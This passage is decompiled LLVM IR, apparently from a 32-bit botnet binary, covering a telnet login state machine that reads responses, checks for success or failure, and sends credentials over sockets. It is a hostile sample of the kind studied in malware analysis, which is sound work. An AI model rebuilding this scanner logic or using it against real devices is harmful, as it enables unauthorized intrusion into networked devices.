  %v2_804c13d = inttoptr i32 %v1_804c13d to i32*
  store i32 1024, i32* %v2_804c13d, align 4
  %v0_804c142 = load i32, i32* @ebx, align 4
  %v2_804c142 = add i32 %v0_804c135, -24
  %v3_804c142 = inttoptr i32 %v2_804c142 to i32*
  store i32 %v0_804c142, i32* %v3_804c142, align 4
  %v5_804c143 = add i32 %v0_804c135, -28
  %v6_804c143 = inttoptr i32 %v5_804c143 to i32*
  store i32 %arg1, i32* %v6_804c143, align 4
  %v0_804c146 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c146 = add i32 %v0_804c135, -32
  %v3_804c146 = inttoptr i32 %v2_804c146 to i32*
  store i32 %v0_804c146, i32* %v3_804c146, align 4
  %v1_804c147 = call i32 @read_until_response(i32 %v6_804b89b)
  %v0_804c14c = load i32, i32* @esp, align 4
  %v1_804c14f = icmp eq i32 %v1_804c147, 0
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  br i1 %v1_804c14f, label %dec_label_pc_804c1dc, label %dec_label_pc_804c157

dec_label_pc_804c157:                             ; preds = %dec_label_pc_804c0ff
  store i32 %v1_804c117, i32* %eax.global-to-local, align 4
  %v2_804c172 = load i32, i32* %v1_804c11a, align 4
  store i32 %v2_804c172, i32* %eax.global-to-local, align 4
  %v2_804c177 = add i32 %v0_804c14c, 16
  %v3_804c177 = inttoptr i32 %v2_804c177 to i32*
  store i32 %v2_804c172, i32* %v3_804c177, align 4
  %v1_804c178 = call i32 @contains_fail(i32 %stack_var_-620.244)
  %v0_804c17d = load i32, i32* @esp, align 4
  %v1_804c180 = icmp eq i32 %v1_804c178, 0
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v1_804c1cc = add i32 %v0_804c17d, 4
  %v2_804c1cc = inttoptr i32 %v1_804c1cc to i32*
  br i1 %v1_804c180, label %dec_label_pc_804c1b0, label %dec_label_pc_804c184

dec_label_pc_804c184:                             ; preds = %dec_label_pc_804c157
  store i32 0, i32* %v2_804c1cc, align 4
  %v0_804c1a2 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c1a2 = inttoptr i32 %v0_804c17d to i32*
  store i32 %v0_804c1a2, i32* %v3_804c1a2, align 4
  %v2_804c1a3 = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804c1a3 = call i32 @advance_state(i32* %v2_804c1a3, i32 %v2_804b755)
  store i32 %v3_804c1a3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c1b0:                             ; preds = %dec_label_pc_804c157
  store i32 5, i32* %v2_804c1cc, align 4
  %v0_804c1ce = load i32, i32* %eax.global-to-local, align 4
  %v3_804c1ce = inttoptr i32 %v0_804c17d to i32*
  store i32 %v0_804c1ce, i32* %v3_804c1ce, align 4
  %v2_804c1cf = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804c1cf = call i32 @advance_state(i32* %v2_804c1cf, i32 %v2_804b755)
  store i32 %v3_804c1cf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c1dc:                             ; preds = %dec_label_pc_804c0ff
  store i32 %v1_804b84e, i32* %eax.global-to-local, align 4
  %v2_804c1f7 = load i32, i32* %v1_804b851, align 4
  store i32 %v2_804c1f7, i32* %eax.global-to-local, align 4
  %v1_804c1f9 = add i32 %v2_804c1f7, 3
  store i32 %v1_804c1f9, i32* @ebx, align 4
  %v1_804c1ff = add i32 %v0_804c14c, 16
  %v2_804c1ff = inttoptr i32 %v1_804c1ff to i32*
  store i32 0, i32* %v2_804c1ff, align 4
  %v1_804c201 = inttoptr i32 %stack_var_-620.244 to i32*
  %v2_804c201 = call i32 @__GI_time(i32* %v1_804c201)
  store i32 %v2_804c201, i32* %eax.global-to-local, align 4
  %v0_804c209 = load i32, i32* @ebx, align 4
  %v7_804c209 = icmp ult i32 %v0_804c209, %v2_804c201
  %v1_804c20b = icmp eq i1 %v7_804c209, false
  br i1 %v1_804c20b, label %dec_label_pc_804c779, label %dec_label_pc_804c211

dec_label_pc_804c211:                             ; preds = %dec_label_pc_804c1dc
  %v0_804c206 = load i32, i32* @esp, align 4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804c22d = inttoptr i32 %v0_804c206 to i32*
  store i32 %v2_804b84c, i32* %v3_804c22d, align 4
  %v1_804c22e = call i32 @reset_telstate(i32 %stack_var_-620.244)
  store i32 %v1_804c22e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c23b:                             ; preds = %dec_label_pc_804b885
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c251 = add i32 %v2_804b9cd, %v2_804b84a
  %v4_804c251 = inttoptr i32 %v3_804c251 to i8*
  %v5_804c251 = load i8, i8* %v4_804c251, align 1
  %v6_804c251 = zext i8 %v5_804c251 to i32
  store i32 %v6_804c251, i32* %eax.global-to-local, align 4
  %v1_804c25a = mul nuw nsw i32 %v6_804c251, 4
  %v2_804c25a = add nuw nsw i32 %v1_804c25a, 134615472
  %v3_804c25a = inttoptr i32 %v2_804c25a to i32*
  %v4_804c25a = load i32, i32* %v3_804c25a, align 4
  %v1_804c26c = and i32 %v4_804c25a, -256
  store i32 %v1_804c26c, i32* %eax.global-to-local, align 4
  %v4_804c26f = inttoptr i32 %v4_804c25a to i8*
  store i32 %v4_804c25a, i32* @edi, align 4
  %v3_804c275 = call i32 @_strlen(i8* %v4_804c26f)
  store i32 %v3_804c275, i32* @esi, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v5_804c294 = load i8, i8* %v4_804c251, align 1
  %v6_804c294 = zext i8 %v5_804c294 to i32
  store i32 %v6_804c294, i32* %eax.global-to-local, align 4
  %v1_804c29d = mul nuw nsw i32 %v6_804c294, 4
  %v2_804c29d = add nuw nsw i32 %v1_804c29d, 134615472
  %v3_804c29d = inttoptr i32 %v2_804c29d to i32*
  %v4_804c29d = load i32, i32* %v3_804c29d, align 4
  store i32 %v4_804c29d, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c2ba = inttoptr i32 %v2_804b84c to i32*
  %v4_804c2ba = load i32, i32* %v3_804c2ba, align 4
  store i32 %v4_804c2ba, i32* %eax.global-to-local, align 4
  %v0_804c2bd = load i32, i32* @esp, align 4
  %v1_804c2bd = add i32 %v0_804c2bd, -4
  %v2_804c2bd = inttoptr i32 %v1_804c2bd to i32*
  store i32 16384, i32* %v2_804c2bd, align 4
  %v0_804c2c2 = load i32, i32* @esi, align 4
  %v2_804c2c2 = add i32 %v0_804c2bd, -8
  %v3_804c2c2 = inttoptr i32 %v2_804c2c2 to i32*
  store i32 %v0_804c2c2, i32* %v3_804c2c2, align 4
  %v0_804c2c3 = load i32, i32* @ebx, align 4
  %v2_804c2c3 = add i32 %v0_804c2bd, -12
  %v3_804c2c3 = inttoptr i32 %v2_804c2c3 to i32*
  store i32 %v0_804c2c3, i32* %v3_804c2c3, align 4
  %v0_804c2c4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c2c4 = add i32 %v0_804c2bd, -16
  %v3_804c2c4 = inttoptr i32 %v2_804c2c4 to i32*
  store i32 %v0_804c2c4, i32* %v3_804c2c4, align 4
  %v4_804c2c5 = call i32 @__libc_send(i32 %v4_804c25a, i32 %stack_var_-620.244, i32 %v2_804b755, i32 %v6_804b89b)
  store i32 %v4_804c2c5, i32* %eax.global-to-local, align 4
  %v0_804c2ca = load i32, i32* @esp, align 4
  %v2_804c2cd = icmp slt i32 %v4_804c2c5, 0
  %v1_804c2cf = icmp eq i1 %v2_804c2cd, false
  store i32 %v1_804b83c, i32* @edx, align 4
  br i1 %v1_804c2cf, label %dec_label_pc_804c2fb, label %dec_label_pc_804c2d1

dec_label_pc_804c2d1:                             ; preds = %dec_label_pc_804c23b
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804c2ed = inttoptr i32 %v0_804c2ca to i32*
  store i32 %v2_804b84c, i32* %v3_804c2ed, align 4
  %v1_804c2ee = call i32 @reset_telstate(i32 %v4_804c25a)
  store i32 %v1_804c2ee, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c2fb:                             ; preds = %dec_label_pc_804c23b
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804c311 = load i32, i32* %v3_804c2ba, align 4
  store i32 %v4_804c311, i32* %eax.global-to-local, align 4
  %v1_804c314 = add i32 %v0_804c2ca, 12
  %v2_804c314 = inttoptr i32 %v1_804c314 to i32*
  store i32 16384, i32* %v2_804c314, align 4
  %v1_804c319 = add i32 %v0_804c2ca, 8
  %v2_804c319 = inttoptr i32 %v1_804c319 to i32*
  store i32 2, i32* %v2_804c319, align 4
  %v1_804c31b = add i32 %v0_804c2ca, 4
  %v2_804c31b = inttoptr i32 %v1_804c31b to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8057704.173 to i32), i32* %v2_804c31b, align 4
  %v0_804c320 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c320 = inttoptr i32 %v0_804c2ca to i32*
  store i32 %v0_804c320, i32* %v3_804c320, align 4
  %v4_804c321 = call i32 @__libc_send(i32 %v4_804c25a, i32 %stack_var_-620.244, i32 %v2_804b755, i32 %v6_804b89b)
  %v0_804c326 = load i32, i32* @esp, align 4
  %v2_804c329 = icmp slt i32 %v4_804c321, 0
  %v1_804c32b = icmp eq i1 %v2_804c329, false
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  br i1 %v1_804c32b, label %dec_label_pc_804c357, label %dec_label_pc_804c32d

dec_label_pc_804c32d:                             ; preds = %dec_label_pc_804c2fb
  %v3_804c349 = inttoptr i32 %v0_804c326 to i32*
  store i32 %v2_804b84c, i32* %v3_804c349, align 4
  %v1_804c34a = call i32 @reset_telstate(i32 %v4_804c25a)
  store i32 %v1_804c34a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c357:                             ; preds = %dec_label_pc_804c2fb
  %v1_804c373 = add i32 %v0_804c326, 4
  %v2_804c373 = inttoptr i32 %v1_804c373 to i32*
  store i32 6, i32* %v2_804c373, align 4
  %v0_804c375 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c375 = inttoptr i32 %v0_804c326 to i32*
  store i32 %v0_804c375, i32* %v3_804c375, align 4
  %v2_804c376 = inttoptr i32 %v4_804c25a to i32*
  %v3_804c376 = call i32 @advance_state(i32* %v2_804c376, i32 %stack_var_-620.244)
  store i32 %v3_804c376, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c383:                             ; preds = %dec_label_pc_804b885
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  %v1_804c39b = add i32 %v2_804b84c, 24
  store i32 %v1_804c39b, i32* %eax.global-to-local, align 4
  %v1_804c39e = inttoptr i32 %v1_804c39b to i32*
  %v2_804c39e = load i32, i32* %v1_804c39e, align 4
  store i32 %v2_804c39e, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c3b6 = inttoptr i32 %v2_804b84c to i32*
  %v4_804c3b6 = load i32, i32* %v3_804c3b6, align 4
  store i32 %v4_804c3b6, i32* %eax.global-to-local, align 4
  %v0_804c3b9 = load i32, i32* @esp, align 4
  %v1_804c3bc = add i32 %v0_804c3b9, -16
  %v2_804c3bc = inttoptr i32 %v1_804c3bc to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_8061240.174 to i32), i32* %v2_804c3bc, align 4
  %v1_804c3c1 = add i32 %v0_804c3b9, -20
  %v2_804c3c1 = inttoptr i32 %v1_804c3c1 to i32*
  store i32 1024, i32* %v2_804c3c1, align 4
  %v0_804c3c6 = load i32, i32* @ebx, align 4
  %v2_804c3c6 = add i32 %v0_804c3b9, -24
  %v3_804c3c6 = inttoptr i32 %v2_804c3c6 to i32*
  store i32 %v0_804c3c6, i32* %v3_804c3c6, align 4
  %v5_804c3c7 = add i32 %v0_804c3b9, -28
  %v6_804c3c7 = inttoptr i32 %v5_804c3c7 to i32*
  store i32 %arg1, i32* %v6_804c3c7, align 4
  %v0_804c3ca = load i32, i32* %eax.global-to-local, align 4
  %v2_804c3ca = add i32 %v0_804c3b9, -32
  %v3_804c3ca = inttoptr i32 %v2_804c3ca to i32*
  store i32 %v0_804c3ca, i32* %v3_804c3ca, align 4
  %v1_804c3cb = call i32 @read_until_response(i32 %v6_804b89b)
  store i32 %v1_804c3cb, i32* %eax.global-to-local, align 4
  %v0_804c3d0 = load i32, i32* @esp, align 4
  %v1_804c3d3 = icmp eq i32 %v1_804c3cb, 0
  br i1 %v1_804c3d3, label %dec_label_pc_804c5be, label %dec_label_pc_804c3db

dec_label_pc_804c3db:                             ; preds = %dec_label_pc_804c383
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804c3e1 = add i32 %v0_804c3d0, 16
  %v2_804c3e1 = inttoptr i32 %v1_804c3e1 to i32*
  store i32 0, i32* %v2_804c3e1, align 4
  %v1_804c3e3 = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804c3e3 = call i32 @__GI_time(i32* %v1_804c3e3)
  store i32 %v2_804c3e3, i32* @esi, align 4
  %v0_804c3f0 = load i32, i32* @ebx, align 4
  %v2_804c400 = mul i32 %v0_804c3f0, 28
  %v1_804c404 = add i32 %v2_804c402, %v2_804c400
  %v2_804c407 = inttoptr i32 %v1_804c404 to i32*
  store i32 %v2_804c3e3, i32* %v2_804c407, align 4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v1_804c39b, i32* %eax.global-to-local, align 4
  %v2_804c424 = load i32, i32* %v1_804c39e, align 4
  store i32 %v2_804c424, i32* %eax.global-to-local, align 4
  %v0_804c426 = load i32, i32* @esp, align 4
  %v2_804c429 = add i32 %v0_804c426, -16
  %v3_804c429 = inttoptr i32 %v2_804c429 to i32*
  store i32 %v2_804c424, i32* %v3_804c429, align 4
  %v1_804c42a = call i32 @contains_fail(i32 %stack_var_-624.243)
  store i32 %v1_804c42a, i32* %eax.global-to-local, align 4
  %v0_804c42f = load i32, i32* @esp, align 4
  %v1_804c432 = icmp eq i32 %v1_804c42a, 0
  store i32 %v1_804b83c, i32* @edx, align 4
  br i1 %v1_804c432, label %dec_label_pc_804c462, label %dec_label_pc_804c436

dec_label_pc_804c436:                             ; preds = %dec_label_pc_804c3db
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v1_804c452 = add i32 %v0_804c42f, 4
  %v2_804c452 = inttoptr i32 %v1_804c452 to i32*
  store i32 0, i32* %v2_804c452, align 4
  %v0_804c454 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c454 = inttoptr i32 %v0_804c42f to i32*
  store i32 %v0_804c454, i32* %v3_804c454, align 4
  %v3_804c455 = call i32 @advance_state(i32* %v1_804c3e3, i32 %stack_var_-620.244)
  store i32 %v3_804c455, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c462:                             ; preds = %dec_label_pc_804c3db
  store i32 %v1_804c39b, i32* %eax.global-to-local, align 4
  %v2_804c47d = load i32, i32* %v1_804c39e, align 4
  store i32 %v2_804c47d, i32* %eax.global-to-local, align 4
  %v3_804c482 = inttoptr i32 %v0_804c42f to i32*
  store i32 %v2_804c47d, i32* %v3_804c482, align 4
  %v1_804c483 = call i32 @contains_success(i32 %stack_var_-624.243)
  store i32 %v1_804c483, i32* %eax.global-to-local, align 4
  %v0_804c488 = load i32, i32* @esp, align 4
  %v1_804c48b = icmp eq i32 %v1_804c483, 0
  store i32 %v1_804b83c, i32* @edx, align 4
  br i1 %v1_804c48b, label %dec_label_pc_804c594, label %dec_label_pc_804c493

dec_label_pc_804c493:                             ; preds = %dec_label_pc_804c462
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c4a9 = add i32 %v2_804b8de, %v2_804b84a
  %v4_804c4a9 = inttoptr i32 %v3_804c4a9 to i8*
  %v5_804c4a9 = load i8, i8* %v4_804c4a9, align 1
  %v6_804c4a9 = zext i8 %v5_804c4a9 to i32
  %v9_804c4a9 = or i32 %v6_804c4a9, %v8_804b89b
  store i32 %v9_804c4a9, i32* %eax.global-to-local, align 4
  %v10_804c4ad = icmp eq i8 %v5_804c4a9, 2
  %v1_804c4af = icmp eq i1 %v10_804c4ad, false
  store i32 %v1_804b83c, i32* @edx, align 4
  br i1 %v1_804c4af, label %dec_label_pc_804c4dd, label %dec_label_pc_804c4b1

dec_label_pc_804c4b1:                             ; preds = %dec_label_pc_804c493
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v1_804c4cd = add i32 %v0_804c488, 4
  %v2_804c4cd = inttoptr i32 %v1_804c4cd to i32*
  store i32 7, i32* %v2_804c4cd, align 4
  %v0_804c4cf = load i32, i32* %eax.global-to-local, align 4
  %v3_804c4cf = inttoptr i32 %v0_804c488 to i32*
  store i32 %v0_804c4cf, i32* %v3_804c4cf, align 4
  %v3_804c4d0 = call i32 @advance_state(i32* %v1_804c3e3, i32 %stack_var_-620.244)
  store i32 %v3_804c4d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c4dd:                             ; preds = %dec_label_pc_804c493
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c4f3 = add i32 %v2_804b9cd, %v2_804b84a
  %v4_804c4f3 = inttoptr i32 %v3_804c4f3 to i8*
  %v5_804c4f3 = load i8, i8* %v4_804c4f3, align 1
  %v6_804c4f3 = zext i8 %v5_804c4f3 to i32
  store i32 %v6_804c4f3, i32* %eax.global-to-local, align 4
  %v1_804c4fc = mul nuw nsw i32 %v6_804c4f3, 4
  %v2_804c4fc = add nuw nsw i32 %v1_804c4fc, 134615472
  %v3_804c4fc = inttoptr i32 %v2_804c4fc to i32*
  %v4_804c4fc = load i32, i32* %v3_804c4fc, align 4
  store i32 %v4_804c4fc, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c519 = add i32 %v2_804ba07, %v2_804b84a
  %v4_804c519 = inttoptr i32 %v3_804c519 to i8*
  %v5_804c519 = load i8, i8* %v4_804c519, align 2
  %v6_804c519 = zext i8 %v5_804c519 to i32
  store i32 %v6_804c519, i32* %eax.global-to-local, align 4
  %v1_804c522 = mul nuw nsw i32 %v6_804c519, 4
  %v2_804c522 = add nuw nsw i32 %v1_804c522, 134615460
  %v3_804c522 = inttoptr i32 %v2_804c522 to i32*
  %v4_804c522 = load i32, i32* %v3_804c522, align 4
  store i32 %v4_804c522, i32* @esi, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804c545 = inttoptr i32 %v0_804c488 to i32*
  store i32 %v2_804b84c, i32* %v3_804c545, align 4
  %v0_804c546 = call i32 @get_telstate_host()
  store i32 %v0_804c546, i32* %eax.global-to-local, align 4
  %v0_804c54b = load i32, i32* @esp, align 4
  %v0_804c54e = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804c54e, i32* %edx.global-to-local, align 4
  %v0_804c557 = load i32, i32* @ebx, align 4
  %v3_804c557 = inttoptr i32 %v0_804c54b to i32*
  store i32 %v0_804c557, i32* %v3_804c557, align 4
  %v0_804c558 = load i32, i32* @esi, align 4
  %v2_804c558 = add i32 %v0_804c54b, -4
  %v3_804c558 = inttoptr i32 %v2_804c558 to i32*
  store i32 %v0_804c558, i32* %v3_804c558, align 4
  %v2_804c559 = add i32 %v0_804c54b, -8
  %v3_804c559 = inttoptr i32 %v2_804c559 to i32*
  store i32 %v0_804c546, i32* %v3_804c559, align 4
  %v1_804c55a = add i32 %v0_804c54b, -12
  %v2_804c55a = inttoptr i32 %v1_804c55a to i32*
  store i32 ptrtoint ([23 x i8]* @global_var_8057707.175 to i32), i32* %v2_804c55a, align 4
  %v0_804c55f = load i32, i32* %edx.global-to-local, align 4
  %v2_804c55f = add i32 %v0_804c54b, -16
  %v3_804c55f = inttoptr i32 %v2_804c55f to i32*
  store i32 %v0_804c55f, i32* %v3_804c55f, align 4
  %v2_804c560 = call i32 @sockprintf(i32 %stack_var_-624.243, i32 %stack_var_-620.244)
  %v0_804c565 = load i32, i32* @esp, align 4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v1_804c584 = add i32 %v0_804c565, 20
  %v2_804c584 = inttoptr i32 %v1_804c584 to i32*
  store i32 7, i32* %v2_804c584, align 4
  %v0_804c586 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c586 = add i32 %v0_804c565, 16
  %v3_804c586 = inttoptr i32 %v2_804c586 to i32*
  store i32 %v0_804c586, i32* %v3_804c586, align 4
  %v3_804c587 = call i32 @advance_state(i32* %v1_804c3e3, i32 %stack_var_-620.244)
  store i32 %v3_804c587, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c594:                             ; preds = %dec_label_pc_804c462
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804c5b0 = inttoptr i32 %v0_804c488 to i32*
  store i32 %v2_804b84c, i32* %v3_804c5b0, align 4
  %v1_804c5b1 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804c5b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c5be:                             ; preds = %dec_label_pc_804c383
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v1_804b84e, i32* %eax.global-to-local, align 4
  %v2_804c5d9 = load i32, i32* %v1_804b851, align 4
  store i32 %v2_804c5d9, i32* %eax.global-to-local, align 4
  %v1_804c5db = add i32 %v2_804c5d9, 7
  store i32 %v1_804c5db, i32* @ebx, align 4
  %v1_804c5e1 = add i32 %v0_804c3d0, 16
  %v2_804c5e1 = inttoptr i32 %v1_804c5e1 to i32*
  store i32 0, i32* %v2_804c5e1, align 4
  %v1_804c5e3 = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804c5e3 = call i32 @__GI_time(i32* %v1_804c5e3)
  store i32 %v2_804c5e3, i32* %eax.global-to-local, align 4
  %v0_804c5eb = load i32, i32* @ebx, align 4
  %v7_804c5eb = icmp ult i32 %v0_804c5eb, %v2_804c5e3
  %v1_804c5ed = icmp eq i1 %v7_804c5eb, false
  br i1 %v1_804c5ed, label %dec_label_pc_804c779, label %dec_label_pc_804c5f3

dec_label_pc_804c5f3:                             ; preds = %dec_label_pc_804c5be
  %v0_804c5e8 = load i32, i32* @esp, align 4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804c60f = inttoptr i32 %v0_804c5e8 to i32*
  store i32 %v2_804b84c, i32* %v3_804c60f, align 4
  %v1_804c610 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804c610, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c61d:                             ; preds = %dec_label_pc_804b885
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804c620 = load i32, i32* @esp, align 4
  %v1_804c623 = add i32 %v0_804c620, -16
  %v2_804c623 = inttoptr i32 %v1_804c623 to i32*
  store i32 0, i32* %v2_804c623, align 4
  %v1_804c625 = inttoptr i32 %v6_804b89b to i32*
  %v2_804c625 = call i32 @__GI_time(i32* %v1_804c625)
  %v0_804c632 = load i32, i32* @ebx, align 4
  %v2_804c642 = mul i32 %v0_804c632, 28
  %v1_804c646 = add i32 %v2_804c402, %v2_804c642
  %v2_804c649 = inttoptr i32 %v1_804c646 to i32*
  store i32 %v2_804c625, i32* %v2_804c649, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804c661 = inttoptr i32 %v2_804b84c to i32*
  %v4_804c661 = load i32, i32* %v3_804c661, align 4
  store i32 %v4_804c661, i32* %eax.global-to-local, align 4
  %v0_804c664 = load i32, i32* @esp, align 4
  %v1_804c664 = add i32 %v0_804c664, -4
  %v2_804c664 = inttoptr i32 %v1_804c664 to i32*
  store i32 16384, i32* %v2_804c664, align 4
  %v1_804c669 = add i32 %v0_804c664, -8
  %v2_804c669 = inttoptr i32 %v1_804c669 to i32*
  store i32 4, i32* %v2_804c669, align 4
  %v1_804c66b = add i32 %v0_804c664, -12
  %v2_804c66b = inttoptr i32 %v1_804c66b to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805771e.176 to i32), i32* %v2_804c66b, align 4
  %v0_804c670 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c670 = add i32 %v0_804c664, -16
  %v3_804c670 = inttoptr i32 %v2_804c670 to i32*
  store i32 %v0_804c670, i32* %v3_804c670, align 4
  %v4_804c671 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804b755, i32 %v6_804b89b)
  %v0_804c676 = load i32, i32* @esp, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804c68f = load i32, i32* %v3_804c661, align 4
  store i32 %v4_804c68f, i32* %eax.global-to-local, align 4
  %v1_804c692 = add i32 %v0_804c676, 12
  %v2_804c692 = inttoptr i32 %v1_804c692 to i32*
  store i32 16384, i32* %v2_804c692, align 4
  %v1_804c697 = add i32 %v0_804c676, 8
  %v2_804c697 = inttoptr i32 %v1_804c697 to i32*
  store i32 7, i32* %v2_804c697, align 4
  %v1_804c699 = add i32 %v0_804c676, 4
  %v2_804c699 = inttoptr i32 %v1_804c699 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8057723.177 to i32), i32* %v2_804c699, align 4
  %v0_804c69e = load i32, i32* %eax.global-to-local, align 4
  %v3_804c69e = inttoptr i32 %v0_804c676 to i32*
  store i32 %v0_804c69e, i32* %v3_804c69e, align 4
  %v4_804c69f = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804b755, i32 %v6_804b89b)
  %v0_804c6a7 = load i32, i32* bitcast ([7 x i8*]* @global_var_80611a0.182 to i32*), align 32
  %v5_804c6b1 = inttoptr i32 %v0_804c6a7 to i8*
  %v1_804c6b7 = and i32 %v0_804c6a7, -256
  store i32 %v1_804c6b7, i32* %eax.global-to-local, align 4
  store i32 %v0_804c6a7, i32* @edi, align 4
  %v3_804c6c0 = call i32 @_strlen(i8* %v5_804c6b1)
  store i32 %v3_804c6c0, i32* @ebx, align 4
  %v0_804c6c9 = load i32, i32* bitcast ([7 x i8*]* @global_var_80611a0.182 to i32*), align 32
  store i32 %v0_804c6c9, i32* @esi, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804c6e5 = load i32, i32* %v3_804c661, align 4
  store i32 %v4_804c6e5, i32* %eax.global-to-local, align 4
  %v0_804c6e8 = load i32, i32* @esp, align 4
  %v1_804c6e8 = add i32 %v0_804c6e8, -4
  %v2_804c6e8 = inttoptr i32 %v1_804c6e8 to i32*
  store i32 16384, i32* %v2_804c6e8, align 4
  %v0_804c6ed = load i32, i32* @ebx, align 4
  %v2_804c6ed = add i32 %v0_804c6e8, -8
  %v3_804c6ed = inttoptr i32 %v2_804c6ed to i32*
  store i32 %v0_804c6ed, i32* %v3_804c6ed, align 4
  %v0_804c6ee = load i32, i32* @esi, align 4
  %v2_804c6ee = add i32 %v0_804c6e8, -12
  %v3_804c6ee = inttoptr i32 %v2_804c6ee to i32*
  store i32 %v0_804c6ee, i32* %v3_804c6ee, align 4
  %v0_804c6ef = load i32, i32* %eax.global-to-local, align 4
  %v2_804c6ef = add i32 %v0_804c6e8, -16
  %v3_804c6ef = inttoptr i32 %v2_804c6ef to i32*
  store i32 %v0_804c6ef, i32* %v3_804c6ef, align 4
  %v5_804c6f0 = call i32 @__libc_send(i32 %v0_804c6a7, i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804b755)
  store i32 %v5_804c6f0, i32* %eax.global-to-local, align 4
  %v0_804c6f5 = load i32, i32* @esp, align 4
  %v2_804c6f8 = icmp slt i32 %v5_804c6f0, 0
  %v1_804c6fa = icmp eq i1 %v2_804c6f8, false
  store i32 %v1_804b83c, i32* @edx, align 4
  br i1 %v1_804c6fa, label %dec_label_pc_804c723, label %dec_label_pc_804c6fc

dec_label_pc_804c6fc:                             ; preds = %dec_label_pc_804c61d
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804c718 = inttoptr i32 %v0_804c6f5 to i32*
  store i32 %v2_804b84c, i32* %v3_804c718, align 4
  %v2_804c719 = call i32 @reset_telstate(i32 %v0_804c6a7)
  store i32 %v2_804c719, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c723:                             ; preds = %dec_label_pc_804c61d
  store i32 %v1_804b84e, i32* %eax.global-to-local, align 4
  %v2_804c73e = load i32, i32* %v1_804b851, align 4
  store i32 %v2_804c73e, i32* %eax.global-to-local, align 4
  %v1_804c740 = add i32 %v2_804c73e, 25
